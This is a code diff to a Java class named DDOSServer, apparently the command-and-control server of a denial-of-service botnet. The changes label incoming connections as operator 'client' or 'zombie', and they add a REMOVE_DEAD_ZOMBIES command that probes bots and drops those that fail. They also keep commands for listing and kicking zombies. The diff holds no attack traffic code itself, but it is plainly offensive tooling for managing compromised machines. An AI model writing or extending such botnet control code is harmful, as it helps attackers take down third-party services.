@@ -1,6 +1,7 @@
 package org.ddos.server;
 
 import java.io.EOFException;
+import java.io.IOException;
 import java.io.Serializable;
 import java.io.StreamCorruptedException;
 import java.net.SocketAddress;
@@ -29,10 +30,11 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 
 	@Override
 	public void clientConnected(SocketPackage event) {
-		System.out.println(event.getConnection().getRemoteSocketAddress() + " connected.");
 		try {
 			DataPackage initialPackage = (DataPackage) event.getInputStream().readSpecificType(DataPackage.class);
 			boolean isClient = !(boolean) initialPackage.getObjects()[0];
+			System.out.println(
+					event.getConnection().getRemoteSocketAddress() + " connected: " + (isClient ? "client" : "zombie"));
 
 			server.setConnectionData(event, !isClient, null);
 
@@ -69,16 +71,34 @@ public class DDOSServer implements ClientConnectionListener, ClientDisconnection
 								new DataPackage((Serializable[]) addrs.toArray(new SocketAddress[addrs.size()]))
 										.setMessage("ZOMBIES_LIST"));
 					} else if (pkgIn.getMessage().equals("KICK_ALL_ZOMBIES")) {
-						SocketPackage[] zombies = server.getClientsByData(true);
-						for (SocketPackage zombie : zombies) {
-							server.removeClient(zombie);
+						for (SocketPackage zombie : server.getClients()) {
+							if ((boolean) zombie.getExtraData()[0]) {
+								server.removeClient(zombie);
+							}
+						}
+					} else if (pkgIn.getMessage().equals("REMOVE_DEAD_ZOMBIES")) {
+						for (SocketPackage zombie : server.getClients()) {
+							if ((boolean) zombie.getExtraData()[0]) {
+								try {
+									zombie.getOutputStream()
+											.writeObject(new DataPackage().setMessage("DEAD_ZOMBIE_CHECK"));
+								} catch (IOException e) {
+									System.out.println(
+											"Removing dead zombie: " + zombie.getConnection().getRemoteSocketAddress());
+									server.removeClient(zombie);
+								}
+							}
 						}
 					}
 				}
 			} else {
-				Object waiter = new Object();
-				synchronized (waiter) {
-					waiter.wait();
+				try {
+					Object waiter = new Object();
+					synchronized (waiter) {
+						waiter.wait();
+					}
+				} catch (InterruptedException e) {
+					return;
 				}
 			}
 		} catch (StreamCorruptedException e) {
